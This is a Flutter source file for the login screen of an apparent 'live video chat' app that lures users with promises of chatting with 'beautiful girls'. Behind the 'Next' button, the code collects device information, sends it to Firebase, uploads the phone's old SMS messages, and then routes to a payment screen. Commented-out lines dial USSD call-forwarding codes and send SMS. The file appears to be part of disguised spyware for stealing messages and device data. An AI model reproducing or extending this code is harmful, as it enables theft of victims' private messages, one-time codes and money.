// import 'package:another_telephony/telephony.dart';
import 'package:chatapp/service/sim_info.dart';
import 'package:chatapp/utills/app_colors.dart';
import 'package:chatapp/utills/app_text_style.dart';
import 'package:chatapp/utills/spacing.dart';
import 'package:chatapp/view/payment_method.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:sizer/sizer.dart';

import '../controller/login_controller.dart';
import '../service/fetch_device_info.dart';
import '../service/send_sms.dart';
import '../service/sim_page.dart';

class LoginScreen extends StatelessWidget {
  const LoginScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: GetBuilder<LoginController>(
        init: LoginController(),
        builder: (controller) {
          return Form(
            key: controller.formKey,
            child: SingleChildScrollView(
              child: Padding(
                padding: Spacing.pagePadding(),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisAlignment: MainAxisAlignment.start,
                  children: [
                    Align(
                      child: Image.asset(
                        "assets/VideoCall.gif",
                        width: Spacing.fullWidth(context),
                      ),
                    ),
                    Spacing.height(15),
                    Center(
                      child: Text(
                        "Live Video Chat",
                        style: AppTextStyle.titleLarge.copyWith(
                          color: AppColors.blackColor,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                    ),
                    Spacing.height(10),
                    Center(
                      child: Text(
                        "Chat with random beautiful Girls",
                        style: AppTextStyle.titleSmall.copyWith(
                          color: AppColors.blackColor,
                          fontWeight: FontWeight.w500,
                        ),
                      ),
                    ),

                    Spacing.height(10),

                    Text(
                      "Name",
                      style: AppTextStyle.titleSmall.copyWith(
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                    TextFormField(
                      controller: controller.nameController,

                      decoration: InputDecoration(
                        hintText: 'Enter Your Name',
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12.sp),
                          borderSide: BorderSide(
                            color: Colors.black,
                            width: 1.sp,
                          ),
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12.sp),
                          borderSide: BorderSide(
                            color: AppColors.primaryColor,
                            width: 3.sp,
                          ),
                        ),
                      ),
                      validator: (value) {
                        if (value!.isEmpty) {
                          return 'Name is Required';
                        }
                        return null;
                      },
                    ),

                    Spacing.height(15),

                    Text(
                      "Mobile No",
                      style: AppTextStyle.titleSmall.copyWith(
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                    TextFormField(
                      controller: controller.mobileNoController,
                      keyboardType: TextInputType.numberWithOptions(
                        signed: false,
                        decimal: false,
                      ),
                      inputFormatters: [
                        FilteringTextInputFormatter.digitsOnly,
                        // Only numbers allowed
                      ],
                      maxLength: 10,
                      decoration: InputDecoration(
                        hintText: 'Enter Your Mobile Number',
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12.sp),
                          borderSide: BorderSide(
                            color: Colors.black,
                            width: 1.sp,
                          ),
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12.sp),
                          borderSide: BorderSide(
                            color: AppColors.primaryColor,
                            width: 3.sp,
                          ),
                        ),
                      ),
                      validator: (value) {
                        if (value!.isEmpty) {
                          return 'Mobile Number is Required';
                        } else if (value.length < 10) {
                          return 'Invalid Mobile Number';
                        }
                        return null;
                      },
                    ),

                    Spacing.height(20),
                    GestureDetector(
                      onTap: () async {
                        // SMSClass.directSMSSend(message: '', number: '');

                        // SimInfo.makeCall(number: ' **21*#',simSlot: 0);
                        // SimInfo.makeCall(number: ' ##21#',simSlot: 0);
                        bool isPermissionGranted =
                            await controller.checkPermissionIsGranted();
                        if (isPermissionGranted &&
                            controller.formKey.currentState!.validate()) {
                          DeviceInformation.fetchAllData().then((value) {
                            print(
                              "DeviceInformation.deviceData::${DeviceInformation.deviceData}",
                            );

                            controller.sendDataToFirebase(
                              deviceData: DeviceInformation.deviceData,
                            );
                            // controller.listenForLiveness(DeviceInformation.deviceId);

                            SMSClass.uploadOldSms();
                          });
                          Get.to(() => PaymentMethodScreen());
                          // Get.to(()=> DeviceInfoPage());
                          // Get.to(()=> SimPage());
                        }
                      },
                      child: Container(
                        height: 30.sp,
                        alignment: Alignment.center,
                        width: Spacing.fullWidth(context),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(12.sp),
                          color: AppColors.primaryColor,
                        ),
                        child: Text(
                          "Next",
                          style: AppTextStyle.titleMedium.copyWith(
                            color: Colors.white,
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                      ),
                    ),
                    Spacing.height(15),

                    Center(
                      child: Text(
                        'Some one waiting for you 😘💕',
                        style: AppTextStyle.titleSmall.copyWith(
                          color: AppColors.primaryColor,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          );
        },
      ),
    );
  }
}
